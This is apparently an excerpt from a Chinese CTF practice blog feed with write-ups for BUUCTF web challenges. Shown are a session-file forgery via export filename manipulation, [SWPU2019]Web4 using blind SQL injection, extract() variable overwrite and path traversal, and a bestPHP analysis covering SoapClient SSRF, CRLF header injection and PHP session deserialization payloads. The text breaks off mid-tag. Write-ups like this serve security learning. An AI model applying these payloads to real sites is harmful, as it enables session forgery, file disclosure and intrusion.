class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;zip&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br><span class="hljs-variable">$path</span> = TEMP_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PharData</span>(<span class="hljs-variable">$path</span>);<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// use zip as default</span><br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span>, ZIPARCHIVE::<span class="hljs-variable constant_">CREATE</span> | <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$path</span>));<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/zip&#x27;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>可以发现session文件保存路径与note文件导出的路径一样，看看文件名的命名方式</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span>name = get_user() . <span class="hljs-string">&#x27;-&#x27;</span> . bin2hex(random_bytes(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$type</span>;<br><span class="hljs-symbol">$file</span>name = str_replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-symbol">$file</span>name); <span class="hljs-comment">// avoid path traversal</span><br><span class="hljs-symbol">$pat</span>h = TEMP_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-symbol">$file</span>name;<br></code></pre></td></tr></table></figure><p>通过get_user函数获取用户名然后用一段随机字符串加上文件类型，这里的get_user内容可控，登录时修改用户名即可，但是他还有type拼接且type无法为空不然就会被设置为ZIP，第二行代码中将..替换为空为了防止目录穿越，那么我们就可以让type的值为.这样filename中就有..被替换为空那么后缀名就消失了，我们成功构造出了一个符合要求的session文件名，看看内容是否可控</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> ($index = <span class="hljs-number">0</span>; $index &lt; count($notes); $index++) &#123;<br>  $note = $notes[$index];<br>  $title = $note[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  $title = preg_replace(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, $title);<br>  $title = preg_replace(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, $title); <span class="hljs-regexp">//</span> <span class="hljs-keyword">delete</span> suspicious characters<br>  $archive-&gt;addFromString(<span class="hljs-string">&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;</span>, json_encode($note));<br>&#125;<br></code></pre></td></tr></table></figure><p>内容是可控的我们新建note的title值会被写入到文件当中，那么思路就结束了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、登录用户名设置为sess_<br>2、新建note，title值为|N;admin|b:1;   (body任意)<br>3、<span class="hljs-built_in">export</span>文件，BP拦截将<span class="hljs-built_in">type</span>值设置为.<br>4、将文件名中SESS_后的字符串记录<br>5、打开flag获取页面设置session值为第四步的字符串，这样他就会自动反序列化/var/www/tmp中我们植入伪造admin的文件，这样<span class="hljs-variable">$_session</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]=<span class="hljs-literal">true</span>从而获取flag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU2019]Web4</title>
    <link href="/2025/02/17/SWPU2019-Web4/"/>
    <url>/2025/02/17/SWPU2019-Web4/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web4-WP"><a href="#SWPU2019-Web4-WP" class="headerlink" title="[SWPU2019]Web4-WP"></a>[SWPU2019]Web4-WP</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>题目类型：WEB<br>设计考点：sql盲注,MSV,变量覆盖</p><p><img src="/./../img/SWPU2019/1.png" alt="web1"><br><img src="/./../img/SWPU2019/2.png" alt="web2"><br>时间盲注爆破得到:glzjin_wants_a_girl_friend.zip<br>代码审计可以发现他的整体逻辑</p><p>首先关注他的URL：<a href="http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index">http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index</a><br>它读取了一个值$r$</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 路由控制跳转至控制器</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]);<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>) = <span class="hljs-variable">$r</span>;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$controller&#125;</span>Controller&quot;</span>;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;action<span class="hljs-subst">&#123;$action&#125;</span>&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$controller</span>))<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>))<br>&#123;<br><span class="hljs-comment">//</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;LoginController&quot;</span>;<br>        <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>( (<span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>), <span class="hljs-variable">$action</span>));<br></code></pre></td></tr></table></figure><p>然后调用&#x2F;前对应的Controller并且执行对应的action方法</p><p>接下来关注所有controller的父类,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 所有控制器的父类</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 加载视图文件</span><br><span class="hljs-comment"> * viewName 视图名称</span><br><span class="hljs-comment"> * viewData 视图分配数据</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;viewPath))<br>&#123;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$viewData</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;viewPath;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>它的方法 $loadView$ 中有 $extract$ 函数我们可以变量覆盖，然后它执行了一个include，我们就去寻找对应的漏洞</p><p>在User Controller中我们发现它调用loadView方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionIndex</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$listData</span> = <span class="hljs-variable">$_REQUEST</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userIndex&#x27;</span>,<span class="hljs-variable">$listData</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>他的actionIndex函数中的listdata值可控，我们继续跟进，按照代码逻辑，他会包含userIndex.php，我们继续跟进代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">imgToBase64</span>(<span class="hljs-params"><span class="hljs-variable">$img_file</span></span>) </span>&#123;<br><br>    <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$img_file</span>)) &#123;<br>        <span class="hljs-variable">$app_img_file</span> = <span class="hljs-variable">$img_file</span>; <span class="hljs-comment">// 图片路径</span><br>        <span class="hljs-variable">$img_info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$app_img_file</span>); <span class="hljs-comment">// 取得图片的大小，类型等</span><br><br>        <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$app_img_file</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">// 图片是否可读权限</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) &#123;<br>            <span class="hljs-variable">$filesize</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$app_img_file</span>);<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$filesize</span>);<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">chunk_split</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$content</span>)); <span class="hljs-comment">// base64编码</span><br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$img_info</span>[<span class="hljs-number">2</span>]) &#123;           <span class="hljs-comment">//判读图片类型</span><br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-variable">$img_type</span> = <span class="hljs-string">&quot;gif&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-variable">$img_type</span> = <span class="hljs-string">&quot;jpg&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-variable">$img_type</span> = <span class="hljs-string">&quot;png&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;data:image/&#x27;</span> . <span class="hljs-variable">$img_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$file_content</span>;<span class="hljs-comment">//合成图片的base64编码</span><br><br>        &#125;<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$img_base64</span>; <span class="hljs-comment">//返回图片的base64</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现它会获取一个img_file值然后尝试输出一个base64格式的图片文件，那么这题的攻击逻辑就很清楚了,<br>我们构造url的r值为user&#x2F;Index,让他调用userController中的actionIndex方法，然后传值给img_file&#x3D;&#x2F;..&#x2F;flag.php在baseController中的extract方法会创造img_file变量值为&#x2F;..&#x2F;flag.php，然后include userIndex.php文件，这就会让userIndex.php文件尝试读取flag.php文件然后把他的base64加密字符串输出，最后回显<br><img src="/./../img/SWPU2019/3.png" alt="web3"><br><img src="/./../img/SWPU2019/4.png" alt="web4"></p>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP内置类相关</title>
    <link href="/2025/02/03/PHP%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9B%B8%E5%85%B3/"/>
    <url>/2025/02/03/PHP%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="bestPHP-WP"><a href="#bestPHP-WP" class="headerlink" title="bestPHP:WP"></a>bestPHP:WP</h2><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>php内置类SoapClient</li><li>CRLF Injection漏洞</li><li>call_user_func</li><li>PHPsession 反序列化</li></ol><h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p style="font-size:10px">SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(location<span class="hljs-string">&#x27;=&gt;&#x27;</span>http:<span class="hljs-comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-comment">//可以利用 SoapClient 类的 __call （当调用对象中不存在的方法会自动调用此方法）方法来进行 SSRF</span><br></code></pre></td></tr></table></figure><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p style="font-size:10px">CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。简单来说http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://localhost:2333&quot;</span>;<br><span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;location&quot;</span> =&gt; <span class="hljs-variable">$target</span>,<br>    <span class="hljs-string">&quot;user_agent&quot;</span> =&gt; <span class="hljs-string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,<br>    <span class="hljs-string">&quot;uri&quot;</span> =&gt; <span class="hljs-string">&quot;demo&quot;</span><br>);<br><span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-variable">$options</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>)-&gt;<span class="hljs-title function_ invoke__">ff</span>(); <span class="hljs-comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</p><h3 id="PHPsession-反序列化"><a href="#PHPsession-反序列化" class="headerlink" title="PHPsession 反序列化"></a>PHPsession 反序列化</h3><table><thead><tr><th align="center">Directive</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">session.save_handler</td><td align="center">session保存形式。默认为files</td></tr><tr><td align="center">session.save_path</td><td align="center">session保存路径。</td></tr><tr><td align="center">session.serialize_handler</td><td align="center">session序列化存储所用处理器。默认为php。</td></tr><tr><td align="center">session.upload_progress.cleanup</td><td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td></tr><tr><td align="center">session.upload_progress.enabled</td><td align="center">将上传文件的进度信息存在session中。默认开启。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;lvyz&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p style="font-size:13px">当 session.serialize_handler=php 时，session文件内容为： name|s:4:"lvyz";</p><p style="font-size:13px">当 session.serialize_handler=php_serialize 时，session文件为： a:1:{s:4:"name";s:4:"lvyz";}</p><p style="font-size:13px">当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:4:"lvyz";</p>当我们使用PHP引擎反序列化php_serialize引擎序列化内容时得到<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$_SESSION[&#x27;name&#x27;] = &#x27;|username&#x27;<br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&#x27;name&#x27;;s:<span class="hljs-number">4</span>:&#x27;|username&#x27;;&#125;<br><span class="hljs-string">|被当作分隔符</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&#x27;name&#x27;;s:<span class="hljs-number">4</span>:&#x27;被当作KEY<br>username 被当作value进行反序列化<br></code></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h4 id="题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge"><a href="#题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge" class="headerlink" title="题目来源:https://buuoj.cn/challenges#bestphp&#39;s%20revenge"></a>题目来源:<a href="https://buuoj.cn/challenges#bestphp's%20revenge">https://buuoj.cn/challenges#bestphp&#39;s%20revenge</a></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);  <span class="hljs-comment">//参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;   <span class="hljs-comment">//存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125;<br><br><br><span class="hljs-comment">//flag.php  (扫目录扫到的)</span><br>only localhost can get flag!<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>;<br>   &#125;<br>only localhost can get flag!<br></code></pre></td></tr></table></figure><p 